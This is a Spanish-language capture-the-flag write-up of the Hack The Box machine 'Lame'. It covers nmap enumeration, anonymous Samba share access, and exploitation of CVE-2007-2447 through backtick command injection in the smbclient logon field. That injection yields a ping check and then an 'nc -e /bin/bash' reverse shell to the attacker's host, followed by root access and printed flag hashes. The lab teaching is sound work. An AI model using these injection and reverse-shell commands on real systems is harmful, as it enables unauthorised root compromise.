---
category: Hack The Box
tags:
  - eJPT
title: Machine Lame
comments: true
image: /assets/img/machines/lame/lamebanner.jpeg
---
# Introducción
En este writeup analizaremos paso a paso la máquina Lame de HackTheBox, una máquina de nivel fácil orientada a principiantes. Durante el proceso, realizaremos una enumeración básica de servicios, identificaremos vulnerabilidades conocidas en versiones antiguas de FTP y Samba, y finalmente explotaremos una de ellas para obtener acceso root al sistema.  
El objetivo principal es comprender cómo una mala configuración o la falta de actualizaciones pueden poner en riesgo todo un servidor.

## Skills
- Explotación de la vulnerabilidad en Samba (CVE-2007-2447)

Aprenderás a explotar la vulnerabilidad en Samba, que afecta las versiones **3.0.20 hasta 3.0.25rc3**, utilizando el **Username Map Script** para ejecutar comandos arbitrarios en el sistema vulnerable.

Te familiarizarás con el proceso de explotación mediante un **payload de ejecución remota de comandos**, que se aprovecha de la configuración incorrecta de Samba.

# Enumeración
```bash
nmap -sCV -p21,22,139,445,3632 10.10.10.3

Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.10.3
Host is up (0.24s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.16.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2025-05-07T00:15:15-04:00
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h00m54s, deviation: 2h49m45s, median: 51s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.69 seconds
```

Al escanear la máquina con Nmap, se identificaron los siguientes puertos abiertos:

![1](/assets/img/machines/lame/1.jpeg)

Estos resultados revelan servicios comunes, pero destacan dos elementos críticos:  
una versión vulnerable del servicio **vsftpd** y un servicio **Samba** que más adelante se demostrará vulnerable a ejecución remota de comandos.

# Explotación samba (CVE-2007-2447)
Después de detectar que los puertos **139** y **445** estaban abiertos, se intentó interactuar con los recursos compartidos de Samba. Para esto, se utilizó el siguiente comando:
```bash
smbclient -L 10.10.10.3 -N --option 'client min protocol = NT1'
```

![2](/assets/img/machines/lame/2.jpeg)
- `-L`: lista los recursos compartidos del servidor.

- `-N`: indica que no se usará autenticación.

- `--option 'client min protocol = NT1'`: fuerza el uso del protocolo SMBv1, necesario para comunicarse con versiones antiguas de Samba.

## Acceso al recurso compartido
Una vez identificados los recursos compartidos, se intentó acceder al recurso `tmp`, el cual estaba disponible sin autenticación:
```bash
smbclient //10.10.10.3/tmp -N --option 'client min protocol = NT1'
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed May  7 00:38:47 2025
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  .ICE-unix                          DH        0  Tue May  6 08:50:02 2025
  vmware-root                        DR        0  Tue May  6 08:50:48 2025
  .X11-unix                          DH        0  Tue May  6 08:50:29 2025
  .X0-lock                           HR       11  Tue May  6 08:50:29 2025
  vgauthsvclog.txt.0                  R     1600  Tue May  6 08:50:01 2025

		7282168 blocks of size 1024. 5386580 blocks available
smb: \>
```

## Verificación de RCE
Después de confirmar que el recurso compartido `/tmp` estaba accesible sin credenciales, se procedió a verificar si era posible ejecutar comandos remotamente a través del vector conocido de explotación en versiones vulnerables de Samba (**3.0.20 a 3.0.25rc3**).
```bash
smb: \> logon "/=` nohup ping -c 1 10.10.16.4`"
```
Este comando intenta ejecutar un ping desde la máquina víctima hacia el atacante. Para confirmar si el comando fue ejecutado, se utiliza tcpdump para estar en escucha en otra terminal con:
```bash
tcpdump -i tun0 icmp -n

tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
00:44:11.709711 IP 10.10.10.3 > 10.10.16.4: ICMP echo request, id 20768, seq 1, length 64
00:44:11.709740 IP 10.10.16.4 > 10.10.10.3: ICMP echo reply, id 20768, seq 1, length 64
```

## Escalada a Shell Remota
Tras confirmar la posibilidad de ejecutar comandos remotamente mediante la vulnerabilidad de Samba, se procedió a obtener una **reverse shell** con privilegios de root:
```bash
smb: \> logon "/=` nohup nc -e /bin/bash 10.10.16.4 443`"
```

Mientras tanto, en otra terminal del host atacante se dejó un listener activo:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.3] 47055
whoami
root
id
uid=0(root) gid=0(root)

script /dev/null -c bash
root@lame:/tmp# 
```

## Captura de Flags
Una vez obtenida la shell como root, se procedió a buscar y capturar las flags que demuestran la explotación exitosa de la máquina.
```bash
root@lame:/tmp# cd /home
root@lame:/home# ls
ftp  makis  service  user
root@lame:/home# cd makis/
root@lame:/home/makis# ls
user.txt
root@lame:/home/makis# cat user.txt 
c5de0909f9e1bacbedd34f928a88beff

root@lame:/home/makis# cd /root
root@lame:/root# ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt 
03b1610fba39cb72f7fb1fa054a4b408
```
